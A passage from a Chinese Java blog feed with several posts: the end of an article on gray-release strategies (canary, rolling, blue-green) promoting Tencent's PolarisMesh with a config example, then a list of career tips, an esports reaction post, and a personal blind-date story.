title="1）金丝雀发布"></a>1）金丝雀发布</h3><blockquote><p>据说以前有个典故，矿工开矿前，会先放一只金丝雀下去，看金丝雀是否能活下来，用来探测是否有毒气，金丝雀发布也是由此得名。</p></blockquote><p>这个典故用在金丝雀发布上面也是同样一个道理，即先升级服务一个实例，如果该实例没有问题，再全部升级剩余实例，如果有问题，再进行回滚。</p><p><img src="http://img.javastack.cn/20221025095802.png"></p><p>金丝雀发布成本较低，只需要一个实例即可降低新版本存在的风险，适合缺乏足够的发布工具研发能力及成长型的小公司。但是，金丝雀发布也有缺点，当升级全部剩余实例时，如果流量过多，可能会导致服务中断。</p><h3 id="2）滚动发布"><a href="#2）滚动发布" class="headerlink" title="2）滚动发布"></a>2）滚动发布</h3><p>滚动发布则是在金丝雀发布的基础上进行的改进和优化，第一次也是使用金丝雀发布，后续则使用多批次的形式发布剩余实例，每次批次之间会进行观察，如果有问题，再进行回滚。</p><p><img src="http://img.javastack.cn/20221025095656.png"></p><p>滚动发布会比较平滑，可以将风险控制到最小程度。它虽然改进了金丝雀发布，但整体发布时间会比较长，回退时间也会更慢，整体流程也更为复杂，适合有一定发布工具研发能力的大公司。</p><h3 id="3）蓝绿发布"><a href="#3）蓝绿发布" class="headerlink" title="3）蓝绿发布"></a>3）蓝绿发布</h3><p>蓝绿发布比较简单，只是对全量发布的一种优化而已，发布前不用全部停机，而是另外部署新版本全部实例，然后再把流量全部再切换到新版本。</p><p><img src="http://img.javastack.cn/20221025095733.png"></p><p>蓝绿发布虽然提升了服务可用性，但没有解决新版本中可能出现的问题，所以核心业务肯定是不建议用的，建议使用滚动发布结合金丝雀发布一起使用，从而降低发布风险。</p><h3 id="4）如何选型"><a href="#4）如何选型" class="headerlink" title="4）如何选型"></a>4）如何选型</h3><p>上面介绍了 3 种灰度发布模式，那么企业应该怎么去根据自身的业务场景的诉求，去选型使用哪种模式来进行灰度发布呢？下面对各种发布模式做了一个对比，以及列举出常见的选型指引，供大家参考。</p><table><thead><tr><th>策略</th><th>零停机</th><th>生产流量测试</th><th>针对特定用户</th><th>机器资源成本</th><th>回滚时长</th><th>负面影响</th><th>实现复杂度</th></tr></thead><tbody><tr><td>全量发布</td><td>×</td><td>×</td><td>×</td><td>低</td><td>慢</td><td>高</td><td>低</td></tr><tr><td>蓝绿发布</td><td>√</td><td>×</td><td>×</td><td>高（双倍）</td><td>快</td><td>中</td><td>中</td></tr><tr><td>金丝雀发布</td><td>√</td><td>√</td><td>√</td><td>中（按需）</td><td>快</td><td>低</td><td>中</td></tr><tr><td>全链路灰度</td><td>√</td><td>√</td><td>√</td><td>中（按需）</td><td>快</td><td>低</td><td>高</td></tr></tbody></table><p><strong>全量发布：</strong>不建议使用，除非实在没有办法，比如初创公司什么都缺，老板又催。</p><p><strong>蓝绿发布</strong>：适合于对于资源预算比较充足的业务，或者是比较简单的单体应用，可以快速实现系统的整体变更，适合传统企业使用。</p><p><strong>金丝雀和全链路灰度</strong>：适合需要针对特定用户或者人群进行现网请求验证的业务，可以显著减低风险，建议成长型企业使用。</p><h2 id="业界灰度发布的实现方案"><a href="#业界灰度发布的实现方案" class="headerlink" title="业界灰度发布的实现方案"></a>业界灰度发布的实现方案</h2><h3 id="Nacos-ZK-Spring-Cloud-dubbo"><a href="#Nacos-ZK-Spring-Cloud-dubbo" class="headerlink" title="Nacos&#x2F;ZK + Spring Cloud&#x2F;dubbo"></a>Nacos&#x2F;ZK + Spring Cloud&#x2F;dubbo</h3><p>Nacos 和 ZK 等组件提供的是纯注册中心的功能，不包括灰度发布的能力。用户如果需要实现灰度发布，则需要在框架层通过编码的方式进行扩展，比如实现 Spring Cloud Gateway&#x2F;Dubbo 的插件等，带来的问题主要有 2 个：</p><ul><li>不同的业务需要重复造轮子，带来不必要的工作量和质量风险</li><li>不同框架实现方式和规则不一样，存在互通性的问题。</li></ul><h3 id="istio"><a href="#istio" class="headerlink" title="istio"></a>istio</h3><p>Istio 通过服务网格的方式提供了灰度发布能力，用户无需自己实现灰度发布逻辑，但是也存在以下问题：</p><ul><li>istio 的数据面不支持 Spring Cloud&#x2F;Dubbo 等常用的微服务框架接入。</li><li>istio + envoy 的 Proxy 模式，运行时会带来额外的资源和网络开销。</li></ul><h2 id="腾讯云实现方案（北极星）"><a href="#腾讯云实现方案（北极星）" class="headerlink" title="腾讯云实现方案（北极星）"></a>腾讯云实现方案（北极星）</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>先简单介绍下腾讯云引擎（TSE）：</p><blockquote><p>微服务引擎（Tencent Cloud Service Engine）提供开箱即用的云上全场景微服务解决方案。支持开源增强的云原生注册配置中心（Zookeeper、Nacos、Etcd、Consul、Eureka 和Apollo），服务治理中心（腾讯自研并开源的 PolarisMesh）、云原生网关（Nginx Ingress、Kong）以及微服务应用托管的弹性微服务平台。微服务引擎完全兼容开源版本的使用方式，在功能、可用性和可运维性等多个方面进行增强，助力用户快速构建微服务架构。</p></blockquote><p><strong>北极星（PolarisMesh）</strong>是腾讯开源的服务发现和治理中心，以<strong>注册配置中心</strong>为基础，扩展了<strong>服务治理</strong>功能以及相应的控制面，各部分功能可单独使用，且<strong>支持无侵入的接入方案</strong>，用户<strong>无需改一行代码</strong>即可接入所有服务治理功能。</p><ul><li><strong>基础：</strong> 服务发现、服务注册、健康检查、配置管理；</li><li><strong>扩展：</strong> 流量调度（动态路由、负载均衡）、熔断降级（实例、接口、服务三级熔断）、访问控制（限流、鉴权）、可观测（调用度量、链路跟踪）</li></ul><p>可以看到，北极星不仅仅是注册中心、配置中心，还是微服务架构中的故障容错、流量控制和安全问题的综合解决方案。虽然业界已经有些组件可以解决其中一部分问题，但是缺少一个标准的、多语言的、框架无关的实现，北极星应运而生。</p><h3 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h3><p>通过北极星可以实现蓝绿、金丝雀或者滚动发布：</p><p><img src="/Users/John/Desktop/20221025112944.svg"></p><p><img src="http://img.javastack.cn/20221025095625.png"></p><h4 id="阶段一：实例打标"><a href="#阶段一：实例打标" class="headerlink" title="阶段一：实例打标"></a>阶段一：实例打标</h4><p>实例打标，指的是发布前先将实例打入新版本标签，这样才能将新版本与稳定旧版本的应用区分开来。</p><p>常用的实例打标方法有以下两种：</p><ul><li><p><strong>实例自注册：</strong> 标签配置在项目的配置文件中，一般是指 Spring Cloud 配置文件中，然后在应用时将标签自动注册到注册中心；</p></li><li><p><strong>k8s 部署标签同步：</strong> 把实例标签作为 k8s 的部署标签进行配置，然后随应用部署后自动同步到注册中心。</p></li></ul><h4 id="阶段二：网关路由"><a href="#阶段二：网关路由" class="headerlink" title="阶段二：网关路由"></a>阶段二：网关路由</h4><p>服务网关，就是服务的网关，它是所有服务的单一访问点，并充当微服务最上层的代理。</p><p>通俗地说，就是，外面的请求需要先经过服务网关，再到达微服务，服务网关实现统一接入，外面的请求不能直接访问微服务，一般的访问顺序是这样的：</p><blockquote><p>用户 &gt; Nginx（集群，Keepalive） &gt; 服务网关（集群） &gt; 微服务（集群）</p></blockquote><p>所以，要进行灰度发布就必须在网关层进行路由控制，在网关层可以按照一定的策略把流量分配到不同的实例版本，常用的灰度策略有百分比、用户属性、省市区域等等，比如：可以先把广东省深圳市 30% 的用户路由到新版本。</p><p>一般的服务网关都需要自行配置路由规则，而且都是代码硬配置，配置项很多很复杂，不是专业的技术人员很难理解其配置的真正意义，也带来了出错的概率。</p><p>而在腾讯云北极星方案中，使用的是云原生网关，<strong>支持图形化的云原生路由规则配置，支持直通注册中心，直接将流量拆分到不同版本的实例中</strong>，大大简化了配置难度，也提高了配置项可读性和易用性。</p><h4 id="阶段三：微服务路由"><a href="#阶段三：微服务路由" class="headerlink" title="阶段三：微服务路由"></a>阶段三：微服务路由</h4><p>来看正常的一个路由流程图：</p><p><img src="http://img.javastack.cn/20221025110237.png"></p><p>流量经过服务网关后，就需要路由到具体的微服务，而灰度发布后各个微服务存在 V1 旧版本和 V2 新版本，所以就需要保证路由过去的多个微服务调用链也必须是同一个版本，不然就可能会带来灾难性故障。</p><p>腾讯云北极星服务治理中心提供了自定义路由的能力，支持通过图形化配置规则的方式，支持自动托管，以及服务调用流量实时监控能力，准确掌握灰度发布的全流程，实现了微服务之间的灰度流量调度。</p><h4 id="阶段四：标签透传"><a href="#阶段四：标签透传" class="headerlink" title="阶段四：标签透传"></a>阶段四：标签透传</h4><p>上一步，网关层会对灰度流量进行染色，在接下来的微服务调用过程中还需要进行标签透传，即将染色标签在每一个微服务之间进行传递，使得微服务可以识别到灰度流量并进行处理。</p><p>使用 Spring Cloud 微服务框架，需要用户自己在项目中进行编码实现，而腾讯北极星方案可以配合腾讯的 Spring Cloud Tencent 微服务框架自动完成标签透传，支持跨线程的透传模式，无需用户感知。</p><p><img src="http://img.javastack.cn/20221028155409.png"></p><h4 id="阶段五：灰度完成"><a href="#阶段五：灰度完成" class="headerlink" title="阶段五：灰度完成"></a>阶段五：灰度完成</h4><p><strong>1）灰度发布验证</strong></p><p>灰度发布后，如何验证灰度发布已经完成&#x2F;成功了呢？一般需要做以下确认操作：</p><p>1）确认流量是否按计划切换到了灰度发布实例；</p><p>2）确认灰度发布实例上的请求是否正常执行；</p><p>腾讯云北极星方案提供了服务治理监控能力，支持可视化看到流量实时切换情况，以及流量的成功率时延等关键指标，大大简化了灰度发布的事后验证工作。</p><p><strong>2）灰度完成后的处理事项</strong></p><p>根据不同的灰度发布形式处理：</p><p><strong>金丝雀发布：</strong> 将稳定版本服务分组全量升级成新版本。</p><p><strong>滚动灰度</strong>： 将稳定版本分组中的多个服务按一定比例分批升级成新版本。</p><p><strong>蓝绿发布：</strong> 流量已经全量切换到新版本分组，老版本分组的实例可以下线。</p><h2 id="北极星开源版体验"><a href="#北极星开源版体验" class="headerlink" title="北极星开源版体验"></a>北极星开源版体验</h2><p>北极星（PolarisMesh）官方网址：</p><blockquote><p><a href="https://polarismesh.cn/">https://polarismesh.cn/</a></p></blockquote><p><img src="http://img.javastack.cn/20221025150730.png"></p><p>北极星（PolarisMesh）已经开源，点击主页右上角可以进入体验版：</p><p><img src="http://img.javastack.cn/20221025150426.png"></p><p>根据提供的默认用户名和密码登录进去，可以在 “<em><strong>服务网格 &gt; 动态路由 &gt; 灰度发布</strong></em>“ 找到灰度发布：</p><p><img src="http://img.javastack.cn/20221025145242.png"></p><p>我们来体验一下金丝雀发布吧，操作流程如下：</p><p><img src="http://img.javastack.cn/20221025151909.png"></p><h3 id="第一步：实例打标"><a href="#第一步：实例打标" class="headerlink" title="第一步：实例打标"></a>第一步：实例打标</h3><p>Spring Cloud Tencent 微服务集成北极星过程略，详细请参考下面接入文档：</p><blockquote><p><a href="https://polarismesh.cn/zh/doc/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/SpringCloud%E5%BA%94%E7%94%A8%E6%8E%A5%E5%85%A5.html#springcloud%E5%BA%94%E7%94%A8%E6%8E%A5%E5%85%A5">https://polarismesh.cn/zh/doc/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/SpringCloud%E5%BA%94%E7%94%A8%E6%8E%A5%E5%85%A5.html#springcloud%E5%BA%94%E7%94%A8%E6%8E%A5%E5%85%A5</a></p></blockquote><p>然后在 bootstrap.yml 配置文件中指定版本标签：</p><pre class="line-numbers language-none"><code class="language-none">spring:  cloud:    tencent:      metadata:        content:          version: 2.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在服务实例所在的操作系统中添加环境变量也可进行打标，例如：<code>SCT_METADATA_CONTENT_version=2.0.0</code> 。</p><p>由于 Spring Cloud 框架默认不会对所有的请求标签进行透传，因此需要增加 Spring Cloud 透传标识，可以通过添加环境变量（<code>SCT_PROTOCOL_CONTENT_TRANSITIVE_HEADER=gray</code>）的方式进行灰度标识（<code>gray:true</code>）的透传。</p><h3 id="第二步：部署应用"><a href="#第二步：部署应用" class="headerlink" title="第二步：部署应用"></a>第二步：部署应用</h3><p>Spring Cloud Tencent 接入方式支持虚拟机、Docker Composer、K8S 等多种部署模式，注意需要保证业务进程与北极星服务的网络连通性。</p><p>部署后，可以在北极星服务列表中看到成功注册的服务实例：</p><p><img src="http://img.javastack.cn/20221025152838.png"></p><h3 id="第三步：微服务路由"><a href="#第三步：微服务路由" class="headerlink" title="第三步：微服务路由"></a>第三步：微服务路由</h3><p>通过配置微服务路由，使进行灰度版本的流量的调用，都只在新版本的服务分组中进行。</p><p>可以在 “<em><strong>服务网格 &gt; 动态路由 &gt; 自定义路由</strong></em>“ 新建路由规则，先配置灰度规则：</p><p><img src="http://img.javastack.cn/20221025153402.png"></p><p>该灰度规则只对 credit 服务生效，这样 header 中带有<code>gray:true</code>灰度标签的请求都只流向<code>version=2.0.0</code>的实例分组。</p><p>再来配置兜底规则：</p><p><img src="http://img.javastack.cn/20221025153411.png"></p><p>该灰度规则只对 credit 服务生效，这样 header 中不带<code>gray:true</code>灰度标签的请求都只流向<code>version=1.0.0</code>的实例分组。</p><h3 id="第四步：灰度发布观测"><a href="#第四步：灰度发布观测" class="headerlink" title="第四步：灰度发布观测"></a>第四步：灰度发布观测</h3><p>通过北极星的可观测性能力，可以准确看到不同分组的流量切换的过程，以及服务调用成功率，等到灰度分组相关指标没有问题，代表灰度验证完成。</p><p>观测路径：“<em><strong>可观测性 &gt; 路由监控</strong></em>”</p><p><img src="http://img.javastack.cn/20221026143806.png"></p><h3 id="第五步：灰度发布收尾"><a href="#第五步：灰度发布收尾" class="headerlink" title="第五步：灰度发布收尾"></a>第五步：灰度发布收尾</h3><p>灰度验证完成后，需要进行收尾：</p><ul><li>灰度验证成功，则对老版本分组的实例进行滚动升级到新版本，否则进行回退；</li><li>在北极星控制台删除自定义路由规则；</li></ul><p>可以看到，北极星提供了一整套的灰度发布解决方案，适用各种灰度发布流程，可视化轻松实现灰度规则配置，最重要的是还提供灰度可视化观测，这使得灰度发布更便利、可控性更好。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看到这里，想必大家对<strong>灰度发布</strong>有了一定程序的认识了，特别是腾讯云提供的<strong>北极星一站式解决方案</strong>，通过其独特的架构理念和可视化平台解决了微服务应用过程中的种种难题，没有灰度发布的加持，全量发布带来的风险将变得举步维艰。</p><p>因为用户体量，或者研发成本的问题，现在很多公司甚至都没用灰度发布，全量发布影响 SLA 不说，一旦造成损失都是不可估量的，所以，不管公司处于什么成长阶段，都必须上灰度发布，这是对用户负责，也是公司能持续发展的重要保障。</p><p>这里贴上北极星的 Github 地址，欢迎大家到 Github 上面点个 Star：</p><blockquote><p><a href="https://github.com/polarismesh">https://github.com/polarismesh</a></p></blockquote><p>作为微服务全面、综合的开源解决方案，北极星在腾讯内部也得到广泛运用：</p><p><img src="http://img.javastack.cn/20221026111121.png"></p><p>从数据可以看到北极星在腾讯内部使用之广，这几乎是覆盖所有业务了，经过这么多年的洗礼，北极星也是成熟稳定的项目了，所以，可靠性还是有保障的，可以闭眼使用，不管合适与否，都值得大家去体验一番。</p><p>最后，通过参与这次腾讯云的 Techo Day 2.0 技术开放日活动，栈长最大的感触就是，在技术领域，腾讯云确实走在了前沿，真不是吹，Techo Day 2.0 活动分享了很多技术热点及解决方案，涵盖了我们平时开发的方方面面，不仅能学习、接触新兴技术，还能对技术有更多、更深入的认识，特别是栈长介绍的<strong>北极星灰度发布</strong>，真真正正的是帮助企业提升项目质量，避免发布风险。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10年老兵给程序员的 10 条建议！</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/10%E5%B9%B4%E8%80%81%E5%85%B5%E7%BB%99%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%2010%20%E6%9D%A1%E5%BB%BA%E8%AE%AE%EF%BC%81/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/10%E5%B9%B4%E8%80%81%E5%85%B5%E7%BB%99%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%2010%20%E6%9D%A1%E5%BB%BA%E8%AE%AE%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="https://images.pexels.com/photos/574071/pexels-photo-574071.jpeg?w=1260&h=750&auto=compress&cs=tinysrgb" alt="image"></p><p>程序员虽然薪资待遇好，但是也得付出努力，技术好才行。特别是对于刚刚进入编程工作的新手程序员和正在学习编程的同学来说，一写代码就报错，出bug。作为一个工作了10年+的老兵，总结了下面10条建议送给程序员。</p><h5 id="1-想清楚，再动手写代码"><a href="#1-想清楚，再动手写代码" class="headerlink" title="1. 想清楚，再动手写代码"></a>1. 想清楚，再动手写代码</h5><p>刚入行的新手，为了展示自己的能力，拿到需求迫不及待地就开始上手写代码，大忌！</p><p><img src="http://img.javastack.cn/17-12-25/32097177.jpg" alt="image"></p><h5 id="2-不交流，就会头破血流"><a href="#2-不交流，就会头破血流" class="headerlink" title="2. 不交流，就会头破血流"></a>2. 不交流，就会头破血流</h5><p>不爱说话和沟通，需求都理解错误了，最后做出来才发现，只能加班返工。</p><p><img src="http://img.javastack.cn/17-12-25/87492001.jpg" alt="image"></p><h5 id="3-文档没人看，但还是要写"><a href="#3-文档没人看，但还是要写" class="headerlink" title="3. 文档没人看，但还是要写"></a>3. 文档没人看，但还是要写</h5><p>文档的作用大部分时候不是用来沟通的，是用来做记录的，大部分需求还是通过口头沟通，但是不写文档做记录，后续就容易扯皮。</p><p><img src="http://img.javastack.cn/17-12-25/34527619.jpg" alt="image"></p><h5 id="4-一定要写注释"><a href="#4-一定要写注释" class="headerlink" title="4. 一定要写注释"></a>4. 一定要写注释</h5><p>时间久了，你会连自己的代码都看不懂。</p><p><img src="http://img.javastack.cn/17-12-25/1087746.jpg" alt="image"></p><h5 id="5-别指望需求会稳定"><a href="#5-别指望需求会稳定" class="headerlink" title="5. 别指望需求会稳定"></a>5. 别指望需求会稳定</h5><p>产品需求是根据商业需求不断调整的，改需求是再正常不过的事，别抱怨。</p><p><img src="http://img.javastack.cn/17-12-25/42834384.jpg" alt="image"></p><h5 id="6-业务高于技术"><a href="#6-业务高于技术" class="headerlink" title="6. 业务高于技术"></a>6. 业务高于技术</h5><p>如果技术不为公司商业做服务，那将毫无价值，公司赚钱才是硬道理。</p><p><img src="http://img.javastack.cn/17-12-25/32153842.jpg" alt="image"></p><h5 id="7-不要心存侥幸"><a href="#7-不要心存侥幸" class="headerlink" title="7. 不要心存侥幸"></a>7. 不要心存侥幸</h5><p>你隐约感觉会出bug的地方，就一定会出bug。</p><p><img src="http://img.javastack.cn/17-12-25/26658879.jpg" alt="image"></p><h5 id="8-自己先测几遍"><a href="#8-自己先测几遍" class="headerlink" title="8. 自己先测几遍"></a>8. 自己先测几遍</h5><p>不要写完就扔给测试人员去测，经自己手的东西，要保证质量。</p><p><img src="http://img.javastack.cn/17-12-25/63497775.jpg" alt="image"></p><h5 id="9-尽可能自己解决问题"><a href="#9-尽可能自己解决问题" class="headerlink" title="9. 尽可能自己解决问题"></a>9. 尽可能自己解决问题</h5><p>遇到不懂的问题，要先尽力解决，别动不动就截个图扔在别人求帮忙，上司和同事不是来给你擦屁股的，但是真的搞砸了就要尽快求助。</p><p><img src="http://img.javastack.cn/17-12-25/16422461.jpg" alt="image"></p><h5 id="10-慎用新技术"><a href="#10-慎用新技术" class="headerlink" title="10. 慎用新技术"></a>10. 慎用新技术</h5><p>新技术是好东西，但没有百分百把握，自作主张用了，多半是作死。</p><p><img src="http://img.javastack.cn/17-12-25/50589481.jpg" alt="image"></p><p>这10点建议还是很有道理的，现在做程序猿都不容易，大家一起加油！争取早日财务自由！</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IG赢了，微博挂了</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/IG%E8%B5%A2%E4%BA%86%EF%BC%8C%E5%BE%AE%E5%8D%9A%E6%8C%82%E4%BA%86/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/IG%E8%B5%A2%E4%BA%86%EF%BC%8C%E5%BE%AE%E5%8D%9A%E6%8C%82%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p>太牛逼了，666，IG赢了，恭喜IG……</p><p>被 IG 拿下英雄联盟总冠军的消息刷屏了，栈长也被 IG 圈粉了。</p><p>同时，我们的老大哥微博又挂了。。</p><p>英雄联盟，真是满满的都是青春，满满的情怀啊，虽然栈长以前一直是个菜鸡。。</p><p>英雄联盟经历了 8 个赛季，中国队第一次登顶总冠军，还是二号种子 IG 战队（创始人：王思聪）。</p><p>虽然栈长很久没玩英雄联盟了，甚至过去都很少看比赛，但唯独今年，看了比过去所有看比赛的时间还有多……从小组赛进 8 强，再到 4 强，再到现在 IG 登顶总冠军，栈长真是追了一个月。。。</p><p>国内头号种子 RNG 战队，被 G2 屌打没进 4 强后，栈长就真气的不想看了，不过还是坚持看下来了，谢谢 IG，谢谢王校长！</p><p>FNC是欧洲第一强队，本次比赛，栈长和朋友打赌 IG 会输。因为之前在小组赛就输给了 FNC，所以 IG 赢的概率很小，最后，栈长输了 200 块。。不过，还是很开心，内心还是希望 IG 赢的。</p><p>IG 赢了之后，栈长的朋友就说王思聪肯定给 IG 打了鸡血，画了很多大饼。不管怎样，IG 不胜众望，拿到了国内第一个 LOL 总冠军，以 3:0 零封 FNC，最小的战队成员居然只有 17 岁，17 岁就登顶冠军，什么概念。。。</p><p>其实我对 IG 这个战队一直很陌生，之前栈长所熟知的只有 OMG、WE、皇族之类的。虽然 IG 是中国队，但看起来好像都是韩国人，栈长也没去详细了解，后来发了朋友圈，才知道有一半是韩国人，难怪韩国人也那么疯狂。。</p><p>不过话又说回来，作为头号种子 RNG，有天才射手小狗，全华班成员，其被冠了太多的光芒，最后躺却在了 4 强的赛场上，被 8 强最弱的战队打败了。栈长看了该场比赛也非常气愤，连解说和我都能看懂的 BP，教练和 RNG 队员却不会，感觉就是强行给自己加难度，过度轻敌，结果回家了，还面临战队解散的危机……</p><p>本不想写这篇文章的，因为这是个 Java 技术号，不太合适分享技术之外的东西。</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个程序员的国庆血泪相亲史，惨败而归…</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%9B%BD%E5%BA%86%E8%A1%80%E6%B3%AA%E7%9B%B8%E4%BA%B2%E5%8F%B2%EF%BC%8C%E6%83%A8%E8%B4%A5%E8%80%8C%E5%BD%92%E2%80%A6/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%9B%BD%E5%BA%86%E8%A1%80%E6%B3%AA%E7%9B%B8%E4%BA%B2%E5%8F%B2%EF%BC%8C%E6%83%A8%E8%B4%A5%E8%80%8C%E5%BD%92%E2%80%A6/</url>
      
        <content type="html"><![CDATA[<p>没错，这个程序员就是博主我。</p><p>伴随着国庆往返的大军，博主我也踏上了幸福的回家之路。</p><p>这不，刚下火车，父亲大人就来接我了。在车上，还有另外一个陌生的阿姨（媒婆），我才得知，要去的目的的不是自己家，而是一个女孩的家，没错，就是被安排了相亲，半路杀出了个程咬金。。</p><p>首先，我的心情是兴奋紧张不安的，兴奋的是终于有希望结束自己多年的青铜单身男了，而紧张不安的是，不知道对方女孩是怎样的人，要是没话题聊就尴尬了。</p><p>很快，车就到了女孩的楼下，就在市区某学校附近的一个小区内。晚风拂袖，小区很老，在这个县级市内格外显得神秘。上楼前，父亲塞给我两包烟，说到时候见到男人就发烟。父亲知道我是不抽烟的，但这个礼节不能丢。</p><p>随着电梯来到五楼，门没有关，室内只有两人，便是女孩的父母。媒婆亲切地前去打招呼，并向众人介绍我和父亲，我连忙发烟，并示好，然后老实地坐下。</p><p>然后媒婆开始介绍我的情况，说我是大学生，又是大城市回来的，做电脑的精英人才，工作稳定，工资 X 万一个月，人听话懂事，反正是各种好话，说得我都快迷上自己了。</p><p>接着，媒婆问怎么不见女孩本人，是不是不在家。女孩父亲叫了一声，才见她缓慢从房间出来，略带羞涩地的看着我，然后我俩各自用家乡话打了个招呼，然后她就坐在了一旁。</p><p>女孩文质彬彬，皮肤白皙，身材有形，也是博主我喜欢的类型，感觉又回到了初恋的感觉，半路被截不亏。然后媒婆开始介绍她的情况，说她在省会城市金银首饰店上班，大学毕业，还没谈过对象（怎么鉴定？）……</p><p>接下来，就是群聊了，他父母亲开始问我一些东西，我父亲和他们的一些对白沟通。才知道，对方是做家具生意的，老板一个，在市里面也有一定的经济基础。什么大学生，什么电脑精英，瞬间感觉自己弱爆了。。</p><p>博主家境贫寒，出身低微，家里早年虽盖了楼房，但生活依然很窘迫。后来，博主考上了二流大学，倾全家及亲戚之力完成了学业，大学期间又自学了Java编程，在经济危机那年又找到了对口的工作，即使如此，到现在也没有改变家境，只是不再那么贫穷而已。</p><p>所以，我和女孩之间是有差距的，我还是有那么点不自信，但我并没有把这个当作放弃的理由，再怎么样我也得试试。尬聊一个小时后，我们乘车离开了女孩家。在车上，媒婆和我聊起了女孩的情况，问我对女孩满不满意，我说可以，然后媒婆说那就行，等她晚点问下情况，第二天再通知我。</p><p>当天晚上，媒婆把我的微信和女孩的手机和微信互相告诉了，当晚我便加了女孩的微信。我们微信聊上了，我说，想约她明天出来玩，女孩没有拒绝我，说明天再看吧。</p><p>第二天，我发微信给那女孩，一遍又一遍，她再也没有回复我了……妈蛋，哪里出问题了？昨晚还好好的。。我顿时感觉有点慌，是不是她手机没电了？电话打过去是通的，但秒挂了。这下，心凉到了冰点。。于是，我叫家人问下媒婆什么情况，心里清楚已经没戏了，但还是得确认下。媒婆说她也不知道，她去问下再告诉我。</p><p>结果到第三天也没等到媒婆的消息，我发消息给女孩，依旧不回，她也没有删除我，几个意思？这是一个怎样的女孩，要拒绝就拒绝，为什么不理人，感觉我就像个多线程被她挂起了，都快超时了她都不想唤醒我！我有点没有耐心了，随手把女孩删除了，自动唤醒结束线程。。</p><p>事情难道就这样结束了吗？心有不甘啊！！！第四天、第五天家人问去媒婆，媒波说先别急，有消息再通知我。难道媒婆启动了 NIO 模型？可以多线程无阻塞异步并发进行？难道她同时给女孩介绍了多个男的，我还傻傻地阻塞在那等待消息返回？虽然这只是我的猜测，但我已经真的不抱希望了。</p><p>第六天，也就是今天，我终于踏上了回深的征程。出发之前，我终于知道结果了，媒婆告诉了家人真相。。家人说，女孩当晚看了我的微信朋友圈，全是看不懂的技术文章分享，没有一点生活的真实写照，让她感觉到我这个人没什么意思，女孩还让媒婆不要那么急着告诉我结果。</p><p>用心良苦啊，难道这就是传说的中的坐以待毙。。对方越不理不问，我这就越乱，一度让我失去理智，乱了分寸，最终删除了女孩，然后我自己亲手结束了这一切。。</p><p>事后，虽然我感觉我这理由很荒唐，但，或许这是她的一种拒绝形式吧。她可能是真不喜欢我，我不会聊天，不会花言巧语，也有可能她只是一种高级视觉动物。如果她的理由是真的，那我就后悔当晚加她微信的决定，如果当晚不加她微信，她就看不到我朋友圈，我们就可能有后续的进展，可能……，已经没有可能了……</p><p>事情到这里也算结束了，各自安好罢矣。不过话又说回来，做程序员多年，确实是少了一些乐趣和情调，脑子里全是代码。自从做公众号以来，基本上没发过生活类的朋友圈了，全是分享技术。虽然，这样会失去了很多亲朋好友的互动和联络，但同时也让我收获了很多额外的技术知识，加深了对技术的理解，也帮助了朋友圈许多的粉丝好友。这条路，我也会继续走下去。</p><p>@All 国庆假快过完了，大家是否也有相同的经历？</p><p>PS:故事发生在几年前的国庆，现在重新整理编排，内容真实度95％，部分有遗忘修补。大家要加博主微信好友的，可以点击左下方的阅读原文链接加入我的知识星球，然后在星球上加我微信，微信粉丝数量有上限，非星球粉丝加不了博主微信！</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么公司宁愿 25K 重新招人，也不给你加到 20K？</title>
      <link href="/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%85%AC%E5%8F%B8%E5%AE%81%E6%84%BF%2025K%20%E9%87%8D%E6%96%B0%E6%8B%9B%E4%BA%BA%EF%BC%8C%E4%B9%9F%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%8A%A0%E5%88%B0%2020K%EF%BC%9F/"/>
      <url>/2025/10/30/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%85%AC%E5%8F%B8%E5%AE%81%E6%84%BF%2025K%20%E9%87%8D%E6%96%B0%E6%8B%9B%E4%BA%BA%EF%BC%8C%E4%B9%9F%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%8A%A0%E5%88%B0%2020K%EF%BC%9F/</url>
      
